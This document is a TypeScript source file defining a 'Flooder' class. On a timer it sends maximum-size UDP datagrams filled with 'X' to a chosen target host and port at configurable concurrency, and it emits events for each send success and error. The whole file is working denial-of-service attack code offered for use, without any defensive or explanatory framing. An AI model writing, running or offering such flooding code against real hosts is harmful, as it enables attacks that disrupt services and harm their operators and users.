
import dgram from "dgram";
import { EventEmitter } from "events";

export enum FlooderEventType {
  sendError = 'send-error',
  sendSuccess = 'send-success',
  loop = 'loop'
}
export class Flooder {
  private readonly payload: Buffer;
  private client: dgram.Socket;
  private intervalHandle: NodeJS.Timeout;
  private eventEmmiter = new EventEmitter();

  constructor(private target: string, private port: number) {
    this.client = dgram.createSocket('udp4');

    var output = "";
    for (var i = 65506; i >= 0; i--) {
      output += "X";
    };

    this.payload = Buffer.from(output);
  }

  start(concurrency: number, timeout: number) {
    const intervalFunc = () => {
      for(var i = 0; i < concurrency; i+=1) {
        this.client?.send(this.payload, 0, this.payload.length, this.port, this.target, (err, bytes) => {
          if (err) {
            this.eventEmmiter?.emit(FlooderEventType.sendError);
            return;
          }
          this.eventEmmiter?.emit(FlooderEventType.sendSuccess);
        });
      }
      this.eventEmmiter?.emit(FlooderEventType.loop);
    };
    this.intervalHandle = setInterval(intervalFunc, timeout);
  }

  stop() {
    clearInterval(this.intervalHandle);
  }

  destroy() {
    this.stop();
    this.client.close();
    this.client = null;
    this.eventEmmiter.removeAllListeners();
    this.eventEmmiter = null;
  }

  on(event: FlooderEventType, listener: any) {
    this.eventEmmiter.on(event, listener);
  }

  once(event: FlooderEventType, listener: any) {
    this.eventEmmiter.once(event, listener);
  }

  off(event: FlooderEventType, listener: any) {
    this.eventEmmiter.off(event, listener);
  }
}